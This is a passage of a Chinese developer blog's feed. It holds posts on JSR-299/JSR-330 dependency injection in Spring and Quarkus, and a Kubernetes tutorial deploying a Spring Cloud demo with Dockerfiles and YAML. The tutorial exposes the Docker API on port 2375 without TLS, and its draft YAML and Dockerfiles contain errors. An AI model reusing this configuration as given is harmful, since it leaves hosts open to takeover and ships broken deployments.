almost nooverlap in the practice. You can even mix JSR-299 / JSR-330 with EJB 3.1- to streamline your application.</p></blockquote><p>JSR 330更像一个低层次的ioc描述，就如同JDBC一样，而JSR299就如同JPA，他凌驾于JDBC、底层使用JDBC并增加了大量的特性。</p><p><strong>所以结论就是，JSR 330和JSR299是上下级的关系，但二者的目的是一致的，这并非是重复造轮子，而是不断的对ioc概念的实现进行摸索的过程。</strong></p><p>下面我们再聊聊Spring和Quarkus。</p><h2id="spring和quarkus在ioc上的区别">Spring和Quarkus在ioc上的区别？</h2><p>实际上，我一句话就能说清了，Spring的那一套DI都是自己，并不是在JSR330或者JSR299上重新写的，而Quarkus则是使用的Java官方的JSR实现，这就是二者的区别了。也就是你使用Spring这一套那肯定避免不了需要依赖，而你如果使用JSR那一套就可以直接使用了。</p><h1 id="后话">后话</h1><p>Quarkus这个框架蛮有意思的，叫<code>Kubernetes native</code>的框架，相较于Spring由于换了底层的虚拟机，<strong>节省了内存开销、加快了启动时间、减小了包的体积等等</strong>，并且支持打包Kubernetes、打包Docker，是不是有点Go语言那个味了？对的，这个框架就是这个目的了：</p><blockquote><p>Quarkus rethinks Java, using a closed-world approach to building andrunning it. It has turned Java into a runtime that's comparable to Go.--- 《A guide to Java serverless functions - Why choose Java forserverless application development and how to getstarted》，OPENSOURCE.COM</p></blockquote><p>为了让Java在也能改头换面，<strong>在Serverless领域能占有一席之地。</strong>我的另一篇文章<ahref="https://float311.gitee.io/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/">CloudProgramming Simplified:A Berkeley View on Serverless Computing · float'sblog(gitee.io)</a>里跟进学习了UCB关于Serverless结构的文章，<strong>里面就有提到要减小内存开销，提高启动速度，这样也能减小成本开销。</strong>那么这个框架就是想区别于Spring(虽然Spring有个SpringFunction)，达到这样的目的，后续我也会跟进学习这个框架的使用，感兴趣的同学可以一起学学。</p><h1 id="参考学习">参考学习</h1><p><a href="https://jcp.org/en/jsr/detail?id=330">The Java CommunityProcess(SM) Program - JSRs: Java Specification Requests - detail JSR#330 (jcp.org)</a></p><p><a href="https://jcp.org/en/jsr/detail?id=299">The Java CommunityProcess(SM) Program - JSRs: Java Specification Requests - detail JSR#299 (jcp.org)</a></p><p><a href="https://dzone.com/articles/what-relation-betwe-there">WhatIs The Relation Between JSR-299 and JSR-330 In Java EE 6? Do We Need TwoDI APIs? - DZone Java</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom: 50%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;emm，更具体地来说其实是闲聊JSR-299与JSR-330，以及进一步澄清Spring的DI和Quarkus的CDI的概念。能疑惑这个问题只能说明我对Java的历史不够了解啊，只是很肤浅的去使用而没有思考其来源。&lt;/p&gt;
&lt;p&gt;思考这个问题是因为我接触了Quarkus这个Java框架，大家一说到区块链一说到容器化可能都会去想go，而不是资源占有大且重量级的Java，这个框架就是用来解决Spring系列在这方面繁重的问题的，具体我会在Quarkus系列中详细叙述该框架的优点。&lt;/p&gt;
&lt;p&gt;今天这篇文章主要内容包括这些：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;澄清一下DI(&lt;em&gt;Dependency Injection&lt;/em&gt;)和CDI(&lt;em&gt;Context and
Dependency
Injection&lt;/em&gt;)的关系与区别，顺带记录一下我自己思考的过程；&lt;/li&gt;
&lt;li&gt;澄清一下记Spring的ioc机制和这二者的关系(其实这俩没关系。。)&lt;/li&gt;
&lt;li&gt;简言一下Quarkus的特点&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://lzwgiter.github.io/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="Quarkus" scheme="https://lzwgiter.github.io/tags/Quarkus/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes-集群环境搭建使用及问题记录（三）</title>
    <link href="https://lzwgiter.github.io/posts/ed901271.html"/>
    <id>https://lzwgiter.github.io/posts/ed901271.html</id>
    <published>2021-08-12T08:07:19.000Z</published>
    <updated>2021-10-29T07:55:44.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>上一篇主要记录了什么是kubernetes的资源编排yaml文件、如何编写yaml文件，并给了一个Hello-world的demo，当然那个只是展示作用，没啥价值。这篇以一个SpringCloud的项目作为例子，记录一下部署到Kubernetes中的全过程。</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png"alt="image-20210810183438958" /><figcaption aria-hidden="true">image-20210810183438958</figcaption></figure></blockquote><span id="more"></span><h1id="实战-编写springcloud项目的资源编排文档">实战-编写SpringCloud项目的资源编排文档</h1><h2 id="一个springcloud的demo">一个SpringCloud的Demo</h2><p>为了学习编写这个资源编排文件，我单独写了一个非常简单的SpringCloud程序，由四部分构成：两个Eureka注册中心、一个叫做<code>MailService</code>的邮箱服务、一个可以用来访问<code>MailService</code>的客户端--称为<code>MailClient</code>，下面我一一展示这四个部件的代码，说明功能，然后把他们搬到Kubernetes里面去。</p><p>项目结构如下所示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">C:.</span><br><span class="line">│  pom.xml</span><br><span class="line">│</span><br><span class="line">├─EntryPoint         # 即MailClient</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─service</span><br><span class="line">│  │  │  │                  └─entrypoint</span><br><span class="line">│  │  │  │                      │  EntryPointApplication.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      ├─client</span><br><span class="line">│  │  │  │                      │      MailClient.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      └─controller</span><br><span class="line">│  │  │  │                              MailClientController.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br><span class="line">│</span><br><span class="line">├─Eureka-1# 即Eureka一号</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─eureka</span><br><span class="line">│  │  │  │                  └─eureka1</span><br><span class="line">│  │  │  │                          Eureka1Application.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br><span class="line">|</span><br><span class="line">├─Eureka-2# 即Eureka二号</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─eureka</span><br><span class="line">│  │  │  │                  └─eureka2</span><br><span class="line">│  │  │  │                          Eureka2Application.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br><span class="line">│</span><br><span class="line">├─MailService# 即邮箱服务</span><br><span class="line">│  │  pom.xml</span><br><span class="line">│  │</span><br><span class="line">│  ├─src</span><br><span class="line">│  │  ├─main</span><br><span class="line">│  │  │  ├─java</span><br><span class="line">│  │  │  │  └─xidian</span><br><span class="line">│  │  │  │      └─lzw</span><br><span class="line">│  │  │  │          └─springcloud</span><br><span class="line">│  │  │  │              └─service</span><br><span class="line">│  │  │  │                  └─mailservice</span><br><span class="line">│  │  │  │                      │  MailServiceApplication.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      ├─controller</span><br><span class="line">│  │  │  │                      │      MailController.java</span><br><span class="line">│  │  │  │                      │</span><br><span class="line">│  │  │  │                      └─service</span><br><span class="line">│  │  │  │                          │  MailService.java</span><br><span class="line">│  │  │  │                          │</span><br><span class="line">│  │  │  │                          └─impl</span><br><span class="line">│  │  │  │                                  GMailServiceImpl.java</span><br><span class="line">│  │  │  │</span><br><span class="line">│  │  │  └─resources</span><br><span class="line">│  │  │          application.yml</span><br></pre></td></tr></table></figure><p>这四个组件的关系如下图。本来应该使用一个Zuul网关来统一管理API的，这里换成了使用了OpenFeign的一个接入节点的服务EntryPoint，优点是提供了Ribbon的负载均衡，后续我们只暴露这个容器的端口来供外部访问。</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810183438958.png"alt="image-20210810183438958" /><figcaption aria-hidden="true">image-20210810183438958</figcaption></figure><p>这里不放代码了，<strong>关于SpringBoot之前有写过IOC和AOP的文章，感兴趣的兄弟可以翻翻。不过确实SpringBoot和SpringCloud的知识确实我没有单独整理过，有空了整整吧，想看的兄弟们给我写个评论就行。</strong></p><h3 id="构建镜像">构建镜像</h3><p>我们分别对这四部分编写Dockerfile，分别如下所示：</p><p><strong>Eureka-1</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/Eureka-1-0.0.1-SNAPSHOT.jar Eureka-1.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;Eureka-1.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>Eureka-2</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/Eureka-2-0.0.1-SNAPSHOT.jar Eureka-2.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;Eureka-2.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>MailService</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/MailService-0.0.1-SNAPSHOT.jar MailService.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;MailService.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p><strong>EntryPoint</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>-jdk-alpine3.<span class="number">9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> lzwgier&lt;float311@<span class="number">163</span>.com&gt;</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./target/EntryPoint-0.0.1-SNAPSHOT.jar EntryPoint.jar</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;EntryPoint.jar&quot;</span>, <span class="string">&quot;&amp;&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>当然你可以把这四个jar和Dockerfile扔到服务器一个个build并打tag，这里我方便，就直接通过IDEA直接连接并制作镜像，我们在master节点上开启一下Docker对外的2375端口：</p><ol type="1"><li><code>vim /lib/systemd/system/docker.service</code></li></ol><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165254879.png"alt="image-20210810165254879" /><figcaption aria-hidden="true">image-20210810165254879</figcaption></figure><ol start="2" type="1"><li><p>查看结果，可以看到暴露了2375端口以及可以正常请求到镜像信息了（<strong>这里没有开始TLS，为了安全应该启用，这里只是本地开发</strong>）</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165239899.png"alt="image-20210810165239899" /><figcaption aria-hidden="true">image-20210810165239899</figcaption></figure></li></ol><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165444488.png"alt="image-20210810165444488" /><figcaption aria-hidden="true">image-20210810165444488</figcaption></figure><p>在IDEA里进行配置：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810165630498.png"alt="image-20210810165630498" /><figcaption aria-hidden="true">image-20210810165630498</figcaption></figure><p>配置每一个应用，这里只展示其中一个，其他同理。<strong>这里我们只构建，不运行（创建容器）</strong></p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810170009706.png"alt="image-20210810170009706" /><figcaption aria-hidden="true">image-20210810170009706</figcaption></figure><p>当然你也可以添加前置任务，比如构建镜像前重新Maven打包一下，这样你就不用手动一个一个去打包了：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810170331052.png"alt="image-20210810170331052" /><figcaption aria-hidden="true">image-20210810170331052</figcaption></figure><p>接下来我们就要去构建镜像了，构建之前我有这些镜像：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810170514544.png"alt="image-20210810170514544" /><figcaption aria-hidden="true">image-20210810170514544</figcaption></figure><p>构建结束后我们就可以看到镜像了：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810173227201.png"alt="image-20210810173227201" /><figcaption aria-hidden="true">image-20210810173227201</figcaption></figure><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810173254861.png"alt="image-20210810173254861" /><figcaption aria-hidden="true">image-20210810173254861</figcaption></figure><h3 id="编写资源编排文档">编写资源编排文档</h3><p>接下来就是另一个重头戏了，我们来编写部署这四个服务的yaml。其实是可以写到一个文件里面的，但是为了考虑到横向扩容等形式，这里我们一个一个部署。首先我们部署两个Eureka，我们按部就班来：</p><ol type="1"><li><p>生成yaml：<code>kubectl create deployment eureka_1 --image=spring-cloud-demo/eureka_1 -o yaml --dry-run=client</code></p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（三）/image-20210810184457882.png"alt="image-20210810184457882" /><figcaption aria-hidden="true">image-20210810184457882</figcaption></figure><p>上面这个文件是一个deployment，我们手动为其添加service的配置，把这俩粘贴到一起：</p><p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">eureka-1</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">eureka-1</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span><span class="comment"># 这个代表部署数量，或者理解为横向扩容量</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">eureka_1</span></span><br><span class="line">  <span class="attr">strategy:</span> &#123;&#125;</span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">eureka_1</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">spring-cloud-demo/eureka_1</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">eureka-1-cg9bp</span></span><br><span class="line">        <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span><span class="comment"># Eureka_1 监听端口</span></span><br><span class="line"><span class="attr">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="section"></h2>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;上一篇主要记录了什么是kubernetes的资源编排yaml文件、如何编写yaml文件，并给了一个Hello-world的demo，当然那个只是展示作用，没啥价值。这篇以一个SpringCloud的项目作为例子，记录一下部署到Kubernetes中的全过程。&lt;/p&gt;
&lt;figure&gt;
&lt;img
src=&quot;/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png&quot;
alt=&quot;image-20210810183438958&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;image-20210810183438958&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="分布式技术" scheme="https://lzwgiter.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"/>
    
    <category term="Kubernete" scheme="https://lzwgiter.github.io/tags/Kubernete/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes-集群环境搭建使用及问题记录（二）</title>
    <link href="https://lzwgiter.github.io/posts/a08eb123.html"/>
    <id>https://lzwgiter.github.io/posts/a08eb123.html</id>
    <published>2021-08-09T02:29:31.000Z</published>
    <updated>2021-10-29T07:55:50.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>上一篇中我搭建了一个单master+三个从节点的Kubernetes集群，并直接使用nginx镜像进行了简单部署。这一篇来主要学习一下Kubernetes最主要的功能--容器编排。本篇将记录容器编排的重要概念、配置文件如何辨写开始，最后展示一个很简单的Hello-world。下一篇将深入实战，部署一个SpringCloud项目。</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png"alt="image-20210810183438958" /><figcaption aria-hidden="true">image-20210810183438958</figcaption></figure></blockquote><span id="more"></span><h2 id="为何以及如何进行容器编排">为何以及如何进行容器编排</h2><p>用过docker-compose的应该都知道，docker-compose通过已yml的格式来叙述，描述如何对不同镜像的容器进行管理，包括设置端口、标签等等，极大地简化了我们自定义Dockerfile再去创建、管理容器的过程。然而docker-compose的作用范围是有限的，它不能一次性在多个机器上部署容器，也不能进行根据实际情况负载均衡等等，所以Docker官方出了一个叫做Swarm的东西，虽然解决了上述问题但是由于提供的功能太少，很少被应用于生产中，所以才有了今天的Kubernetes。</p><p>类似地，Kubernetes也使用yml文件来进行容器编排工作，我们直接使用<code>kubectl</code>进行应用就可以了。其实前面我们部署网络插件<em>Flannel</em>的时候就已经用到这个东西了，那个<code>kube-flannel.yml</code>就是资源编排文件。</p><h2 id="怎么写资源编排文档">怎么写资源编排文档？</h2><h3 id="资源编排文件常用字段及其含义">资源编排文件常用字段及其含义</h3><p>下面我们先来直接看一个Demo：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span>   <span class="comment"># 以上为第一部分，为控制器部分</span></span><br><span class="line">  <span class="attr">template:</span>        <span class="comment"># 以下为第二部分，为被控制对象部分</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>首先这个yaml文档由两部分构成：<strong>控制器部分</strong>和<strong>被控制对象部分</strong>。上述的关键字含义如下：</p><table><colgroup><col style="width: 17%" /><col style="width: 82%" /></colgroup><thead><tr class="header"><th>名称</th><th>含义</th></tr></thead><tbody><tr class="odd"><td>apiVersion</td><td>API版本</td></tr><tr class="even"><td><strong>kind</strong></td><td>资源类型（比如常用的Deployment，使用kubectlapi-resources就可以查看）</td></tr><tr class="odd"><td>metadata</td><td>资源元数据（一些比如名称、命名空间等属性）</td></tr><tr class="even"><td>spec</td><td>资源规格</td></tr><tr class="odd"><td>replicas</td><td>副本数量</td></tr><tr class="even"><td>selector</td><td>标签选择器</td></tr><tr class="odd"><td>template</td><td>Pod模板</td></tr><tr class="even"><td>metadata</td><td>Pod元数据</td></tr><tr class="odd"><td>template.spec</td><td>Pod规格</td></tr><tr class="even"><td>containers</td><td>容器配置</td></tr></tbody></table><h2 id="如何开始写呢">如何开始写呢？</h2><h3 id="新建文档">新建文档</h3><p>从前一章节的关键字表可以看到，资源编排文档中有大量的关键字，记忆起来比较困难，所以我们有两种方式来编写：</p><ul><li>kubectl create来生成yaml文件并进行修改</li><li>若资源已经部署，则可以使用kubectlget命令导出其yaml文件并对其进行修改</li></ul><p>第一种方式比如我们创建一个例子，先来看一下create命令的help：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210809175523694.png"alt="image-20210809175523694" /><figcaption aria-hidden="true">image-20210809175523694</figcaption></figure><p>我们创建一个测试：<code>kubectl create deployment web --image=nginx -o yaml --dry-run=client</code>，参数含义如下：</p><ul><li><code>deployment</code>代表开发环境，后面跟名称</li><li><code>--image</code>代表使用的镜像名称</li><li><code>-o yaml</code>代表输出yaml格式</li><li><code>--dry-run=client</code>代表不在集群中执行，只生成yaml文件，</li></ul><p>结果如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">web</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">web</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">web</span></span><br><span class="line">  <span class="attr">strategy:</span> &#123;&#125;</span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">creationTimestamp:</span> <span class="literal">null</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">web</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line"><span class="attr">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>第二种方式我们去找一个已经部署的pod，比如我已经部署了的nginx（这里没开那个虚拟机所以挂了）</p><p>：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210809180052697.png"alt="image-20210809180052697" /><figcaption aria-hidden="true">image-20210809180052697</figcaption></figure><p>我们直接导出：<code>kubectl get deployment nginx -o yaml</code>，结果如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 